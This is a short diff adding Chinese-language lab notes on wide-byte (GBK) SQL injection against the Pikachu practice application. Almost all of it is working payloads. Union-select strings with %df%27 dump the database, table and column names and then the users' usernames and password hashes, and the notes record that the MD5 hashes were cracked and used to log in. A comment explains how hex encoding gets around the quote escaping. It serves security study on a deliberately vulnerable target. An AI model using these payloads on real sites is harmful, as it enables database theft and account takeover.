@@ -1,0 +1,11 @@
+Pikachu-宽字节注入-源代码为GBK编码转义
+爆库名
+1%df%27 union select 1,database()-- 
+爆表名
+1%df%27 union select 1,group_concat(table_name)from information_schema.tables where table_schema=0x70696b61636875--                     
+#'pikachu'被转义，尝试%df%27pikachu%df%27发现不行,原来的语句为select id,email from member where username='$name'   如果后面用%df%27就会变成    %df%5c%27pikachu%df%5c%27=运'pikachu运' SQL语法错误，就直接用十六进制
+爆列名
+1%df%27 union select 1,group_concat(column_name)from information_schema.columns where table_name=0x7573657273-- 
+爆内容
+1%df%27 union select username,password from users-- 
+得出账户和密码，密码MD5解码后成功登录
